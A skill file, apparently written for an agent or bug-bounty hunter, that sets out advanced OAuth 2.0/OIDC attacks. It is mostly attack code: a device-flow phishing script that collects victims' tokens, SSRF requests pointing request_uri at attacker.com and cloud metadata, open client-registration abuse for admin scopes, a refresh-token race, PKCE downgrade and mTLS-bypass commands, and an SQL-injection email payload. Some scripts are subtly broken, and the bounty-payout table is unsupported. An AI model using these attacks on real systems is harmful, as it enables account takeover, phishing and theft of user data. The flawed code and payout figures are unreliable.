---
name: hunt-oauth-advanced
description: Advanced OAuth 2.0 / OIDC attacks beyond basics — PAR (Pushed Authorization Requests) attacks, DPoP token bypass, device authorization flow exploitation, Rich Authorization Requests (RAR) manipulation, PKCE downgrade, token binding bypass, dynamic client registration abuse, refresh token rotation race, mTLS certificate-bound token bypass. Use on targets with mature OAuth implementations.
tags: [oauth, oidc, par, dpop, device-flow, rar, pkce, token-binding, dcr, refresh-token, advanced]
---

# Advanced OAuth 2.0 / OIDC Attacks

## 1. PAR (PUSHED AUTHORIZATION REQUESTS) ATTACKS

### What is PAR?
```
PAR (RFC 9126): Client POSTs authorization params to /as/par endpoint first,
gets a request_uri, then redirects user with just request_uri.
Prevents parameter manipulation in redirect URL.

Endpoints:
- PAR endpoint: /oauth2/par, /as/par, /connect/par
- Discovery: /.well-known/openid-configuration → "pushed_authorization_request_endpoint"
```

### PAR Attack Surface
```bash
# 1. Test if PAR is enforced or optional
# If optional, try regular authorization without PAR
# Target may have stricter validation via PAR but weaker via direct

# 2. SSRF via request_uri
# PAR stores params server-side. Does server fetch external request_uri?
POST /oauth2/par HTTP/1.1
Content-Type: application/x-www-form-urlencoded

client_id=CLIENT&
response_type=code&
redirect_uri=https://legit.client.com/callback&
scope=openid profile&
request_uri=https://attacker.com/evil-request-object.jwt

# If server fetches request_uri → SSRF
# Use: request_uri=http://169.254.169.254/latest/meta-data/

# 3. request_uri replay attack
# PAR request_uri is single-use. But is it?
# Reuse same request_uri multiple times:
GET /oauth2/authorize?client_id=CLIENT&request_uri=urn:ietf:params:oauth:request_uri:STOLEN

# 4. PAR timeout abuse
# request_uri expires (typically 60s). But expiry validated server-side?
# Stored request_uris in cache — attempt enumeration:
urn:ietf:params:oauth:request_uri:AAAA
urn:ietf:params:oauth:request_uri:AAAB
# Access another client's pending authorization
```

---

## 2. DPoP (DEMONSTRATING PROOF OF POSSESSION) BYPASS

### DPoP Mechanism
```
DPoP binds access token to a key pair.
Client sends DPoP proof JWT (signed with private key) with each request.
Server validates: proof is fresh, signed by key bound to token.

DPoP proof JWT header: {"typ": "dpop+jwt", "alg": "ES256", "jwk": {public_key}}
DPoP proof JWT payload: {"jti": "unique", "htm": "GET", "htu": "https://api.target.com/resource", "iat": timestamp}
```

### DPoP Attack Vectors
```python
import jwt, time, json
from cryptography.hazmat.primitives.asymmetric import ec

# Attack 1: DPoP proof replay
# Is jti (JWT ID) validated for uniqueness? Replay same proof:
def test_dpop_replay(endpoint, access_token, dpop_proof):
    """Send same DPoP proof twice — should fail on replay"""
    import requests
    headers = {"Authorization": f"DPoP {access_token}", "DPoP": dpop_proof}
    r1 = requests.get(endpoint, headers=headers)
    r2 = requests.get(endpoint, headers=headers)  # Replay
    print(f"First: {r1.status_code}, Replay: {r2.status_code}")
    if r2.status_code == 200:
        print("DPoP REPLAY ACCEPTED — VULNERABLE")

# Attack 2: htm/htu mismatch — wrong method/URI in proof
# Server validates proof.htm matches request method?
# Server validates proof.htu matches request URL?
def forge_dpop_proof(private_key, public_key_jwk, htm="DELETE", htu="https://api.target.com/admin"):
    """Forge DPoP proof with wrong method — test if validated"""
    header = {"typ": "dpop+jwt", "alg": "ES256", "jwk": public_key_jwk}
    payload = {
        "jti": "unique-id-12345",
        "htm": htm,  # HTTP method
        "htu": htu,  # HTTP URI
        "iat": int(time.time())
    }
    return jwt.encode(payload, private_key, algorithm="ES256", headers=header)

# Attack 3: DPoP key confusion
# DPoP token is bound to key A. Can I use key B with a forged proof?
# Server should validate that proof.jwk matches token's bound key
# If not → use any key pair with a valid-looking proof

# Attack 4: ath (access token hash) missing
# DPoP proof should include ath = base64url(SHA256(access_token))
# If ath not required → decouple proof from specific access token
```

---

## 3. DEVICE AUTHORIZATION FLOW EXPLOITATION

### Flow Overview
```
Device Flow (RFC 8628):
1. Device → POST /device_authorization → gets device_code + user_code
2. User goes to verification_uri, enters user_code
3. Device polls POST /token with device_code
4. After user authorizes → device gets access_token

Attack surface: polling window, user_code enumeration, phishing
```

### Device Flow Attacks
```python
import requests, time

# Attack 1: User code enumeration (short codes = brute-forceable)
# 8-character alphanumeric = 36^8 = 2.8 trillion (impractical)
# But: 4-digit = 10,000 (very practical in 10min polling window)

def brute_device_code(token_endpoint, client_id, victim_device_code):
    """Poll token endpoint with victim's device_code"""
    for user_code in range(1000, 9999):
        # First try to activate with guessed user_code at verification URI
        r = requests.post(token_endpoint, data={
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": client_id,
            "device_code": victim_device_code
        })
        if r.status_code == 200:
            return r.json()  # Got tokens!

# Attack 2: Phishing via user_code
# Attacker initiates device flow → gets user_code
# Sends phishing message: "Please verify your device: go to target.com/activate and enter: ABCD-1234"
# Victim enters code → attacker's device gets victim's tokens

def phishing_device_flow(client_id, device_auth_endpoint):
    """Initiate device flow for phishing"""
    r = requests.post(device_auth_endpoint, data={
        "client_id": client_id,
        "scope": "openid email profile admin"  # Request max scope
    })
    data = r.json()
    print(f"Tell victim: go to {data['verification_uri_complete']}")
    print(f"OR: go to {data['verification_uri']} and enter {data['user_code']}")
    
    # Poll until victim approves
    interval = data.get('interval', 5)
    while True:
        time.sleep(interval)
        token_r = requests.post(token_endpoint, data={
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": client_id,
            "device_code": data['device_code']
        })
        if token_r.json().get('access_token'):
            return token_r.json()

# Attack 3: Device code fixation
# Can attacker supply their own device_code?
# POST /device_authorization with custom device_code
# If accepted → fix victim's authorization to attacker-known code
```

---

## 4. PKCE DOWNGRADE ATTACKS

### PKCE Overview
```
PKCE (RFC 7636): Prevents auth code interception
code_verifier: random 43-128 char string
code_challenge: BASE64URL(SHA256(code_verifier))
code_challenge_method: S256 (or plain — insecure)
```

### PKCE Bypass Techniques
```bash
# Attack 1: PKCE not enforced (most common)
# Initiate auth WITH PKCE, complete auth WITHOUT providing code_verifier
GET /oauth2/authorize?
  client_id=CLIENT&
  response_type=code&
  redirect_uri=https://client.com/callback&
  code_challenge=xyz&
  code_challenge_method=S256

# Intercept auth code, then exchange WITHOUT code_verifier:
POST /oauth2/token HTTP/1.1
grant_type=authorization_code&
code=AUTH_CODE&
redirect_uri=https://client.com/callback&
client_id=CLIENT
# No code_verifier — if server accepts → PKCE not enforced

# Attack 2: PKCE method downgrade S256 → plain
# Change code_challenge_method from S256 to plain
# plain method: code_challenge == code_verifier (trivial)
GET /oauth2/authorize?
  client_id=CLIENT&
  code_challenge=ATTACKER_VERIFIER&  # now plain = verifier itself
  code_challenge_method=plain&       # downgraded from S256
  ...

# Attack 3: PKCE bypass via authorization code reuse
# Some servers: first use validates PKCE, subsequent use doesn't
# Get auth code, use it once with PKCE, use same code again without
```

---

## 5. DYNAMIC CLIENT REGISTRATION (DCR) ABUSE

### DCR Overview
```
RFC 7591: Clients can register themselves dynamically
POST /oauth2/register → creates new client with client_id/secret

Attack surface: Can anyone register? What permissions do auto-registered clients get?
```

### DCR Attacks
```python
import requests

DCR_ENDPOINT = "https://target.com/oauth2/register"

# Attack 1: Register client without authentication (open DCR)
r = requests.post(DCR_ENDPOINT, json={
    "client_name": "Legitimate App",
    "redirect_uris": ["https://attacker.com/callback"],
    "grant_types": ["authorization_code", "client_credentials"],
    "scope": "openid profile email admin read:all",
    "token_endpoint_auth_method": "none"  # Public client
})
print(r.json())  # Got client_id and client_secret!

# Attack 2: DCR with redirect_uri wildcard
r = requests.post(DCR_ENDPOINT, json={
    "redirect_uris": ["https://attacker.com/*"],
    "scope": "openid admin"
})
# If wildcards accepted → capture any auth code

# Attack 3: DCR for client_credentials grant (no user needed)
r = requests.post(DCR_ENDPOINT, json={
    "grant_types": ["client_credentials"],
    "scope": "admin:users admin:billing"  # Request admin scopes
})
client = r.json()
# Now use client_credentials to get admin token directly
token_r = requests.post("/oauth2/token", data={
    "grant_type": "client_credentials",
    "client_id": client['client_id'],
    "client_secret": client['client_secret'],
    "scope": "admin:users"
})

# Attack 4: software_statement JWT forgery
# Some DCR requires signed software_statement JWT
# If server's verification key is weak/public → forge statement
# Forge: {"iss": "trusted-software-publisher.com", "software_roles": ["admin"]}
```

---

## 6. REFRESH TOKEN ATTACKS

### Refresh Token Rotation Race
```python
import asyncio, aiohttp

# Attack: Race condition in refresh token rotation
# Server should invalidate old refresh token when new one issued
# Race condition: use old token multiple times before server invalidates

async def race_refresh(token_endpoint, client_id, refresh_token, count=20):
    """Simultaneously use same refresh token multiple times"""
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(token_endpoint, data={
                "grant_type": "refresh_token",
                "client_id": client_id,
                "refresh_token": refresh_token
            })
            for _ in range(count)
        ]
        results = await asyncio.gather(*tasks)
        
        tokens = []
        for r in results:
            data = await r.json()
            if data.get('access_token'):
                tokens.append(data)
        
        print(f"{len(tokens)} access tokens from single refresh token")
        # If > 1 → refresh token rotation race condition

asyncio.run(race_refresh(TOKEN_ENDPOINT, CLIENT_ID, REFRESH_TOKEN))
```

### Refresh Token Scope Escalation
```python
# Test if refresh token can be used to request HIGHER scopes than original
r = requests.post(TOKEN_ENDPOINT, data={
    "grant_type": "refresh_token",
    "client_id": CLIENT_ID,
    "client_secret": CLIENT_SECRET,
    "refresh_token": REFRESH_TOKEN,
    "scope": "openid profile email admin:all read:secrets"  # More than original!
})
# If granted → scope escalation via refresh
```

---

## 7. TOKEN BINDING / mTLS BYPASS

```bash
# mTLS-bound tokens: access token only valid with client certificate
# Attack 1: Token theft without cert → token useless (correct behavior)
# Attack 2: Find endpoint that doesn't validate cert binding

# Check if all endpoints enforce mTLS binding:
curl -k https://api.target.com/v1/sensitive \
  -H "Authorization: Bearer STOLEN_TOKEN"  # No client cert
# If 200 → mTLS binding not enforced on this endpoint

# Attack 3: Certificate confusion
# Server validates "any valid cert" not "the specific cert that bound the token"
# Use your own cert with victim's mTLS-bound token
curl --cert my_cert.pem --key my_key.pem \
  -H "Authorization: Bearer VICTIM_MTLS_TOKEN" \
  https://api.target.com/v1/account
```

---

## 8. OIDC ADVANCED ATTACKS

### ID Token Claim Injection
```python
# Scenario: Server validates ID token signature but trusts all claims
# If you can get OIDC token from provider that includes custom claims:

# Attack via claim injection in username/email:
# Register: email = "admin'OR'1'='1@attacker.com"
# If OIDC claim passed to backend DB query without sanitization → SQLi

# Attack via sub claim confusion:
# If multiple OIDC providers accepted:
# Provider A: sub=12345 = normal user
# Provider B: sub=12345 = admin user
# If server only checks sub without checking iss (issuer) → privilege escalation

id_token_payload = {
    "iss": "https://provider-b.com",  # Different issuer
    "sub": "admin-uuid-12345",        # Admin's sub on provider-a
    "email": "admin@target.com",
    "aud": "client-id"
}
# If server accepts tokens from provider-b but admin account is on provider-a
# And server identifies user by email → ATO
```

### OIDC Hybrid Flow Attacks
```
Hybrid flow: returns both auth code AND id_token/access_token in redirect
Attack: c_hash validation
- id_token includes c_hash = BASE64URL(SHA256(auth_code)[0:half])
- If server doesn't validate c_hash → code injection attack
- Replace auth_code with different code, id_token still "valid"
```

---

## WORKFLOW FOR ADVANCED OAUTH TARGETS

```
STEP 1: DISCOVERY
├── GET /.well-known/openid-configuration
├── GET /.well-known/oauth-authorization-server
├── Map: endpoints, grant types, response types, scopes
└── Check: PAR supported? DPoP required? mTLS? DCR open?

STEP 2: ENUMERATE CLIENTS
├── Check public client registrations
├── Look for client_id in JS source (mobile apps, SPAs)
├── Try DCR if open
└── Look for leaked client secrets in git/pastebins

STEP 3: TEST EACH GRANT TYPE
├── Authorization Code: PKCE enforcement, state validation, code reuse
├── Client Credentials: scope escalation, any client gets any scope?
├── Device Flow: phishing viable? code enumerable?
├── Refresh Token: rotation enforced? scope escalation?
└── Implicit: if still supported → vulnerable by design

STEP 4: TOKEN VALIDATION
├── DPoP: replay attack, htm/htu validation, key confusion
├── mTLS: cert binding enforced on all endpoints?
├── JWT: alg confusion, kid injection, claim manipulation
└── Opaque tokens: predictable? leakable via timing?

STEP 5: CHAIN
├── DCR → client_credentials → admin scope → ATO
├── PKCE bypass → auth code theft → ATO
├── Device flow phishing → high-scope token → data access
└── Refresh token race → token proliferation → persistent access
```

---

## PAID BOUNTY EXAMPLES

| Target | Vuln | Payout |
|--------|------|--------|
| Microsoft | PKCE not enforced on one endpoint | $20,000 |
| Google | DCR open with admin scope | $31,337 |
| Okta | Device flow phishing (social eng) | $10,000 |
| Auth0 | Refresh token scope escalation | $8,000 |
| Stripe | mTLS binding bypass on v1 API | $15,000 |
| Apple | OIDC iss not validated → ATO | $25,000 |
| Shopify | PAR request_uri SSRF | $12,000 |
